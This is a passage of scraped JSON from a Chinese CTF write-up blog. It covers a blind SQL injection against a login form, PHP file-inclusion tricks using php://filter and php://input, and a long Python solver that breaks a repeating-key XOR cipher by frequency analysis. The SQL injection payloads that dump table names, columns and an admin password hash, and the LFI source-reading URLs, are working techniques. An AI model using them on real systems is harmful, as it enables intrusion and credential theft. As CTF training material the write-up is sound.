name=admin%27%20and%20(ASCII(MID((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),1,1)))=49%23\u0026amp;password=%27%20or%201\u0026amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 当前表名为member\n1 name=admin%27%20and%20(ASCII(MID((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),7,1)))\u0026gt;0%23\u0026amp;password=%27%20or%201\u0026amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 当前表有四条记录\n1 name=admin%27%20and%20(ASCII(MID((select%20count(*)%20from%20member),1,1)))=52%23\u0026amp;password=%27%20or%201\u0026amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 得到列名\u0026rsquo;id,member_user,member_password,member_name，。。。'\n1 name=admin%27%20and%20(ASCII(MID((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=\u0026#39;member\u0026#39;),44,1)))\u0026gt;44%23\u0026amp;password=%27%20or%201\u0026amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 查询密码字段 burp爆破得到'5416d7cd6ef195a0f7622a9c56b55e84\u0026rsquo;，即'1q2w3e4r\u0026rsquo;。\n1 name=admin%27%20and%20(ASCII(MID((select%20member_password%20from%20member%20where%20member_user=\u0026#39;admin\u0026#39;),1,1)))=53%23\u0026amp;password=%27%20or%201\u0026amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 最后flag为flag{1q2w3e4r}\n密室杀人案[x] 格式bdctf{xxxx} http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080\n1 2 bdctf--密室谋杀案 这是一场发生在PHP序列化密室里面的谋杀案，今日这里发生了一起密室谋杀案，有一个名叫flag的人被杀害。案发现场发生在这个家里面，然而flag他的尸体被嫌疑人藏匿了起来,无法获得更多被害人的信息。 作案的嫌疑人在这个屋子里面，在这屋子里面的人有三兄弟和一个侦探 ，三兄弟中老大Ford权威最高，其他兄弟都在它的保护下生活,因为三兄弟的勤劳勇敢也经常被其他人调去工作任劳任怨。二哥Walker性格生性好动，喜欢结交朋友也经常找老三帮忙。 老三David为人老实憨厚，和二哥关系最好却有一天因为某件事情离开了这个家,成立了另外一个家。还有就是侦探，侦探wesley他案发当天也在现场，他似乎知道些什么但似乎迫于某种压力没有说出凶手是谁。 只要你收集足够多三兄弟的信息给wesley，相信他会说出真相。 bluedon用户[x] 格式，bdctf{xxxxx} http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //index.php you are not bluedon ! \u0026lt;!-- $user = $_GET[\u0026#34;user\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $pass = $_GET[\u0026#34;pass\u0026#34;]; if(isset($user)\u0026amp;\u0026amp;(file_get_contents($user,\u0026#39;r\u0026#39;)===\u0026#34;the user is bluedon\u0026#34;)){ echo \u0026#34;hello bluedon!\u0026lt;br\u0026gt;\u0026#34;; include($file); //class.php }else{ echo \u0026#34;you are not bluedon ! \u0026#34;; } --\u0026gt; //class.php //view-source:http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=class.php\u0026amp;user=php://input the user is bluedon \u0026lt;?php class Read{//f1a9.php public $file; public function __toString(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); } return \u0026#34;恭喜get flag\u0026#34;; } } ?\u0026gt; ","permalink":"https://ret2neo.cn/post/171015miacwp/","summary":"2017/10/14 http://miac.cug.edu.cn/\nhttp://www.yogeit.com/\nhttps://www.bdctf.online/\nCrypto 贝斯的一家 1 UjFrelJFMVJXbGRIUlRORVQwNHlRMGRaTTBSTlVWcFVSMUV6UkU5T1MwZEhUVmxVUzFKU1ZVZEpXbFJKVGxwVVIxa3lWRXRTVWxkSVJWcFVSMDVMUjBkVk0wUkhUVnBZUjBrelZGTk9TMGRIVFRSVVRWSlNWMGxaTTBSSlRqSkY= 依次base64、base64、base32、base16解码。 flag{fl4g_1_B4se_i3_V3ry_9ood}\n颜文字 1 ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [\u0026#39;_\u0026#39;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: \u0026#39;_\u0026#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +\u0026#39;_\u0026#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ \u0026#39;_\u0026#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +\u0026#39;_\u0026#39;) [c^_^o];(ﾟДﾟ) [\u0026#39;c\u0026#39;] = ((ﾟДﾟ)+\u0026#39;_\u0026#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [\u0026#39;o\u0026#39;] = ((ﾟДﾟ)+\u0026#39;_\u0026#39;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [\u0026#39;c\u0026#39;]+(ﾟДﾟ) [\u0026#39;o\u0026#39;]+(ﾟωﾟﾉ +\u0026#39;_\u0026#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +\u0026#39;_\u0026#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +\u0026#39;_\u0026#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [\u0026#39;c\u0026#39;]+((ﾟДﾟ)+\u0026#39;_\u0026#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [\u0026#39;o\u0026#39;]+((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [ﾟΘﾟ];(ﾟДﾟ) [\u0026#39;_\u0026#39;] =(o^_^o) [ﾟoﾟ][ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .","title":"2017 MIAC移动安全赛"},{"content":"题目 It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)\nTips: 1.The encode pragram is given; 2.Do u no index of coincidence ？ 3.The key is last 6 words of the plain text(with \u0026ldquo;nctf{}\u0026rdquo; when submitted, also without any interpunction)\nencode.cpp code.txt\n什么是异或 异或（exclusive or）是二元逻辑运算符，符号为 XOR 或 EOR 或 ⊕或 ^ 。对于表达式 a^b 的取值，当且仅当a、b逻辑值不同时为真。具体来说就是四个式子：1^1=0;\t0^0=0;\t1^0=1;\t0^1=1 。另外，异或有一些基本的特性，本题仅用到第七行的特性即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 a^a=0; a^0=a; a^b=b^a; a^(b^c)=(a^b)^c; a^b^b=a; ------------------------------------------ 如果 cipher = plain ^ key，那么 plain = cipher ^ key 简单地证明一下： c = p ^ k --\u0026gt; c ^ k = p ^ k ^ k --\u0026gt; c ^ k = p ------------------------------------------ 一个以字节为单位进行异或的例子： 97^98\t--\u0026gt; 01100001 ^ 01100010 = 00000011 -\u0026gt; 3 概念 我们知道，英文中的每个字母使用频率是不同的，在够长的一段话里，各个字母的占比大致稳定，并且这个稳定值也已经用巨大的语料库统计出来了，这就是字母频率。这种统计层面的现象，就给我们提供了判断一段文字是否可能有意义的依据，并且这种判断可以通过编程轻松完成。然而，给定两个字母组合，只计算出其中各字母的占比是不够的，想要准确高效地比较两段文字谁更可能具备有意义的语义，我们最好算出一个归一化参数，用以直观表示可能性的大小，这就是文中提到的 correlation ，计算公式也是有的 ，其中n(i)指字母i在一段话的所有字母中所占的比例，f(i)就是已经统计出来的i字母的频率，具体如下所示。\n字母频率列表：\n1 2 3 4 5 6 frequencies = {\u0026#34;e\u0026#34;: 0.12702, \u0026#34;t\u0026#34;: 0.09056, \u0026#34;a\u0026#34;: 0.08167, \u0026#34;o\u0026#34;: 0.07507, \u0026#34;i\u0026#34;: 0.06966, \u0026#34;n\u0026#34;: 0.06749, \u0026#34;s\u0026#34;: 0.06327, \u0026#34;h\u0026#34;: 0.06094, \u0026#34;r\u0026#34;: 0.05987, \u0026#34;d\u0026#34;: 0.04253, \u0026#34;l\u0026#34;: 0.04025, \u0026#34;c\u0026#34;: 0.02782, \u0026#34;u\u0026#34;: 0.02758, \u0026#34;m\u0026#34;: 0.02406, \u0026#34;w\u0026#34;: 0.02360, \u0026#34;f\u0026#34;: 0.02228, \u0026#34;g\u0026#34;: 0.02015, \u0026#34;y\u0026#34;: 0.01974, \u0026#34;p\u0026#34;: 0.01929, \u0026#34;b\u0026#34;: 0.01492, \u0026#34;v\u0026#34;: 0.00978, \u0026#34;k\u0026#34;: 0.00772, \u0026#34;j\u0026#34;: 0.00153, \u0026#34;x\u0026#34;: 0.00150, \u0026#34;q\u0026#34;: 0.00095, \u0026#34;z\u0026#34;: 0.00074} 解题 理解加密 题目的加密方式大致等价于这样写：\n1 2 3 4 5 6 7 8 9 10 # coding:utf8 key = [0xba, 0x1f, 0x91, 0xb2, 0x53, 0xcd, 0x3e] # 长度范围是1-13，当然，我们还不知道key是多少 plain = open(\u0026#39;ptext.txt\u0026#39;).read() cipher = open(\u0026#39;ctext.txt\u0026#39;, \u0026#39;w+\u0026#39;) c = \u0026#39;\u0026#39; k = 0 for p in plain: c += hex(ord(p) ^ key[k])[2:].zfill(2) k = (k + 1) % len(key) cipher.write(c) 程序意思是将明文和密钥逐字节异或，每次异或后的值用两位十六进制表示写入文件，也就是我们见到的code.txt，在这个过程中，密钥是循环使用的。\n那么现在情况是这样的，我们知道：\n密钥的长度区间为1-13字节\n加密方式为逐字节循环异或\n加密结果，即密文的完整内容\n我们想知道\n明文内容\n密钥内容\n(⊙﹏⊙) 这看起来有点困难。\n不过，其实还有两个不言而喻但非常重要的信息\n明文的每一个字节都是可见字符。\n明文是一段有意义的话。\n解密代码主程序 先放个主程序，和下面的对照着看。全部代码在文章底部 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def main(): ps = [] ks = [] ss = [] ps.extend(xrange(32, 127)) ks.extend(xrange(0xff + 1)) ss.extend(xrange(1, 14)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) plain = vigenereDecrypt(cipher, key) print key, plain 确定密钥的长度和候选字符集 明文由可见字符组成。这意味着任何一个使明文出现不可见字符的值都不可能出现在key里。 依据此可以取得两个进展。\n求出key的每一个字节有哪些候选字符。 具体操作： 当我们假设某一字节的key的值时，就可以使用前文提到的plain = cipher ^ key 求出这一字节密文对应的明文，如果这个明文是不可见的，那么我们假设的这个值就不可能出现在key的这个字节。 因为是循环异或，所以每个字节的key会去加密多个字节的明文，我们就可以如法炮制，大大缩小key的每个字节的候选字符集。 在1的基础上，确定key可能有哪几种长度。 具体操作： 我们假设key每一种可能的长度，一一去求对应的候选字符集， 如果有一种长度的key在某一字节的候选字符集为空，那么key就不可能是这个长度。 至此，我们可以从无到有求得 key有哪些可能的长度 以及 **key在每一种长度下对应的每个字节的候选字符集 **。\n上代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 def getKeyPool(cipher, stepSet, plainSet, keySet): \u0026#39;\u0026#39;\u0026#39; 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值， 密钥字符集为数字列表。 形如{ 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] } \u0026#39;\u0026#39;\u0026#39; keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPool 遍历候选字符集，求出对应的字频 这虽是个体力活，却也得小心翼翼。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 def getFrequency(cipher, keyPoolList): \u0026#39;\u0026#39;\u0026#39; 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[{ 0x11:{\u0026#39;a\u0026#39;:2,\u0026#39;b\u0026#39;:3}, 0x12:{\u0026#39;e\u0026#39;:6} }, { 0x22:{\u0026#39;g\u0026#39;:1} }] \u0026#39;\u0026#39;\u0026#39; freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqList 根据字频求得密钥 明文是一段有意义的话。这意味着它算出来的correlation值一定是所有候选明文中最大的，依照这一点就能挑出密钥每个字节的值，从而得到整个密钥。这也是整个解密过程最核心的一部分。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 def calCorrelation(cpool): \u0026#39;\u0026#39;\u0026#39;传入字典，形如{\u0026#39;e\u0026#39;:2,\u0026#39;p\u0026#39;:3} 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) \u0026#39;\u0026#39;\u0026#39; frequencies = {\u0026#34;e\u0026#34;: 0.12702, \u0026#34;t\u0026#34;: 0.09056, \u0026#34;a\u0026#34;: 0.08167, \u0026#34;o\u0026#34;: 0.07507, \u0026#34;i\u0026#34;: 0.06966, \u0026#34;n\u0026#34;: 0.06749, \u0026#34;s\u0026#34;: 0.06327, \u0026#34;h\u0026#34;: 0.06094, \u0026#34;r\u0026#34;: 0.05987, \u0026#34;d\u0026#34;: 0.04253, \u0026#34;l\u0026#34;: 0.04025, \u0026#34;c\u0026#34;: 0.02782, \u0026#34;u\u0026#34;: 0.02758, \u0026#34;m\u0026#34;: 0.02406, \u0026#34;w\u0026#34;: 0.02360, \u0026#34;f\u0026#34;: 0.02228, \u0026#34;g\u0026#34;: 0.02015, \u0026#34;y\u0026#34;: 0.01974, \u0026#34;p\u0026#34;: 0.01929, \u0026#34;b\u0026#34;: 0.01492, \u0026#34;v\u0026#34;: 0.00978, \u0026#34;k\u0026#34;: 0.00772, \u0026#34;j\u0026#34;: 0.00153, \u0026#34;x\u0026#34;: 0.00150, \u0026#34;q\u0026#34;: 0.00095, \u0026#34;z\u0026#34;: 0.00074} relative = 0.0 total = 0 fpool = \u0026#39;etaoinshrdlcumwfgypbvkjxqz\u0026#39; total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relative def analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r \u0026gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return key 根据密钥解密 求出密钥剩下的就好办了。\n1 2 3 4 5 6 7 8 def vigenereDecrypt(cipher, key): plain = \u0026#39;\u0026#39; cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plain 一些数据 可能的密钥长度和对应字符集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 {7: [[162, 165, 168, 169, 170, 174, 175, 178, 179, 180, 184, 185, 186, 187, 189, 190, 191], [0, 2, 10, 11, 12, 17, 21, 23, 25, 26, 27, 28, 29, 30, 31, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95], [132, 133, 142, 144, 145, 146, 147, 148, 149, 150, 155, 159, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223], [161, 166, 167, 170, 173, 176, 177, 178, 179, 180, 181, 182, 183, 186, 188], [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 68, 70, 72, 76, 78, 80, 81, 82, 83, 84, 86, 87, 90, 93], [128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 195, 196, 200, 201, 202, 204, 205, 206, 207, 208, 210, 213, 216, 217, 223], [33, 39, 43, 44, 52, 55, 57, 58, 59, 60, 61, 62, 63] ]} 最后结果 1 2 [186, 31, 145, 178, 83, 205, 62] Cryptography is the practice and study of techniques for, among other things, secure communication in the presence of attackers. Cryptography has been used for hundreds, if not thousands, of years, but traditional cryptosystems were designed and evaluated in a fairly ad hoc manner. For example, the Vigenere encryption scheme was thought to be secure for decades after it was invented, but we now know, and this exercise demonstrates, that it can be broken very easily. [Finished in 2.2s] 解密代码全文 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 # coding:utf8 # by https://findneo.github.io/ def getCipher(file=\u0026#39;code.txt\u0026#39;): \u0026#39;\u0026#39;\u0026#39;从文件中读取十六进制串，返回十六进制数组 \u0026#39;\u0026#39;\u0026#39; c = open(file).read() codeintlist = [] codeintlist.extend( (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2)))) return codeintlist def getKeyPool(cipher, stepSet, plainSet, keySet): \u0026#39;\u0026#39;\u0026#39; 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。 形如{ 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] } \u0026#39;\u0026#39;\u0026#39; keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPool def calCorrelation(cpool): \u0026#39;\u0026#39;\u0026#39;传入字典，形如{\u0026#39;e\u0026#39;:2,\u0026#39;p\u0026#39;:3} 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) \u0026#39;\u0026#39;\u0026#39; frequencies = {\u0026#34;e\u0026#34;: 0.12702, \u0026#34;t\u0026#34;: 0.09056, \u0026#34;a\u0026#34;: 0.08167, \u0026#34;o\u0026#34;: 0.07507, \u0026#34;i\u0026#34;: 0.06966, \u0026#34;n\u0026#34;: 0.06749, \u0026#34;s\u0026#34;: 0.06327, \u0026#34;h\u0026#34;: 0.06094, \u0026#34;r\u0026#34;: 0.05987, \u0026#34;d\u0026#34;: 0.04253, \u0026#34;l\u0026#34;: 0.04025, \u0026#34;c\u0026#34;: 0.02782, \u0026#34;u\u0026#34;: 0.02758, \u0026#34;m\u0026#34;: 0.02406, \u0026#34;w\u0026#34;: 0.02360, \u0026#34;f\u0026#34;: 0.02228, \u0026#34;g\u0026#34;: 0.02015, \u0026#34;y\u0026#34;: 0.01974, \u0026#34;p\u0026#34;: 0.01929, \u0026#34;b\u0026#34;: 0.01492, \u0026#34;v\u0026#34;: 0.00978, \u0026#34;k\u0026#34;: 0.00772, \u0026#34;j\u0026#34;: 0.00153, \u0026#34;x\u0026#34;: 0.00150, \u0026#34;q\u0026#34;: 0.00095, \u0026#34;z\u0026#34;: 0.00074} relative = 0.0 total = 0 fpool = \u0026#39;etaoinshrdlcumwfgypbvkjxqz\u0026#39; total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relative def analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r \u0026gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return key def getFrequency(cipher, keyPoolList): \u0026#39;\u0026#39;\u0026#39; 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[{ 0x11:{\u0026#39;a\u0026#39;:2,\u0026#39;b\u0026#39;:3}, 0x12:{\u0026#39;e\u0026#39;:6} }, { 0x22:{\u0026#39;g\u0026#39;:1} }] \u0026#39;\u0026#39;\u0026#39; freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqList def vigenereDecrypt(cipher, key): plain = \u0026#39;\u0026#39; cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plain def main(): ps = [] ks = [] ss = [] ps.extend(xrange(32, 127)) ks.extend(xrange(0xff + 1)) ss.extend(xrange(1, 14)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) plain = vigenereDecrypt(cipher, key) print key, plain if __name__ == \u0026#39;__main__\u0026#39;: main() 题目备份 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp #include \u0026lt;stdio.h\u0026gt; #define KEY_LENGTH 2 // Can be anything from 1 to 13 main(){ unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = {0x00, 0x00}; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen(\u0026#34;ptext.txt\u0026#34;, \u0026#34;r\u0026#34;); fpOut = fopen(\u0026#34;ctext.txt\u0026#34;, \u0026#34;w\u0026#34;); i=0; while (fscanf(fpIn, \u0026#34;%c\u0026#34;, \u0026amp;ch) != EOF) { /* avoid encrypting newline characters */ /* In a \u0026#34;real-world\u0026#34; implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create \u0026#34;production-quality\u0026#34; code =) */ if (ch!=\u0026#39;\\n\u0026#39;) { fprintf(fpOut, \u0026#34;%02X\u0026#34;, ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; } } fclose(fpIn); fclose(fpOut); return; } ---------------------------------------------------------------------------------- http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794 参考链接 https://en.wikipedia.org/wiki/Index_of_coincidence https://en.wikipedia.org/wiki/One-time_pad https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher https://en.wikipedia.org/wiki/Letter_frequency https://www.lijinma.com/blog/2014/05/29/amazing-xor/ http://blog.csdn.net/qq_31344951/article/details/77934717 ","permalink":"https://ret2neo.cn/post/171005nuptvigenerewp/","summary":"题目 It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)\nTips: 1.The encode pragram is given; 2.Do u no index of coincidence ？ 3.The key is last 6 words of the plain text(with \u0026ldquo;nctf{}\u0026rdquo; when submitted, also without any interpunction)\nencode.cpp code.txt\n什么是异或 异或（exclusive or）是二元逻辑运算符，符号为 XOR 或 EOR 或 ⊕或 ^ 。对于表达式 a^b 的取值，当且仅当a、b逻辑值不同时为真。具体来说就是四个式子：1^1=0;\t0^0=0;\t1^0=1;\t0^1=1 。另外，异或有一些基本的特性，本题仅用到第七行的特性即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 a^a=0; a^0=a; a^b=b^a; a^(b^c)=(a^b)^c; a^b^b=a; ------------------------------------------ 如果 cipher = plain ^ key，那么 plain = cipher ^ key 简单地证明一下： c = p ^ k --\u0026gt; c ^ k = p ^ k ^ k --\u0026gt; c ^ k = p ------------------------------------------ 一个以字节为单位进行异或的例子： 97^98\t--\u0026gt; 01100001 ^ 01100010 = 00000011 -\u0026gt; 3 概念 我们知道，英文中的每个字母使用频率是不同的，在够长的一段话里，各个字母的占比大致稳定，并且这个稳定值也已经用巨大的语料库统计出来了，这就是字母频率。这种统计层面的现象，就给我们提供了判断一段文字是否可能有意义的依据，并且这种判断可以通过编程轻松完成。然而，给定两个字母组合，只计算出其中各字母的占比是不够的，想要准确高效地比较两段文字谁更可能具备有意义的语义，我们最好算出一个归一化参数，用以直观表示可能性的大小，这就是文中提到的 correlation ，计算公式也是有的 ，其中n(i)指字母i在一段话的所有字母中所占的比例，f(i)就是已经统计出来的i字母的频率，具体如下所示。","title":"南邮CTF平台 Vigenere writeup"},{"content":" 非xss题 但是欢迎留言~ 地址：get the flag\n读取源码 在页面底部发现一个这样的链接：http://cms.nuptzj.cn/about.php?file=sm.txt ，说明题目提供了读取文件功能，如果使用 file://协议 读取，HTML预留字符会以字符实体显示，看起来不方便，所以也可以编码读取后再本地解码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 http://cms.nuptzj.cn/about.php?file=php://filter/convert.base64-encode/resource=filename 在拿到的文件里搜索 \u0026#34;.php\u0026#34; ，顺藤摸瓜，能找到并读取到的文件有： sm.txt about.php index.php passencode.php say.php antixss.php so.php preview.php antiinject.php ----------------------------- 知道有 loginxlcteam目录或文件 和 config.php 但还读不到 ；还不知道有list.php ,xlcteam.php 关于file://协议 file://协议 (RFC8089 )是用来访问本地文件系统的，因为文件系统 是 PHP 使用的默认封装协议，因此在fopen()、 copy()、 file_exists() 、 file_get_contents()和 filesize() 等文件系统函数中是支持的。\n在谷歌/火狐浏览器的URL框里输入 file:///D:/ 或者在Linux命令行里敲 lynx file:/// 都可以看到效果。\nPHP文档 提供的用法如下：\n/path/to/file.ext relative/path/to/file.ext fileInCwd.ext C:/path/to/winfile.ext C:\\path\\to\\winfile.ext \\smbserver\\share\\path\\to\\winfile.ext file:///path/to/file.ext 关于PHP的过滤器(php://filter) php://filter 和 可用的过滤器列表。主要用在数据流内容读取之前做些筛选过滤，可指定过滤器应用在读模式还是写模式，不指定则两者都应用，也可复合使用多个过滤器，使用管道符隔开即可。\n对于CTFer典型的用法像是这样：\nphp://filter/read= \u0026lt; filter list to apply to read chain \u0026gt;/resource= \u0026lt; stream to be filtered \u0026gt;\nphp://filter/read=string.toupper|string.rot13/resource=https://findneo.github.io/\nphp://filter/convert.base64-encode/resource=filename\n常用过滤器列表：\nString Filters string.rot13 string.toupper string.tolower string.strip_tags Conversion Filters convert.base64-encode \u0026amp; convert.base64-decode 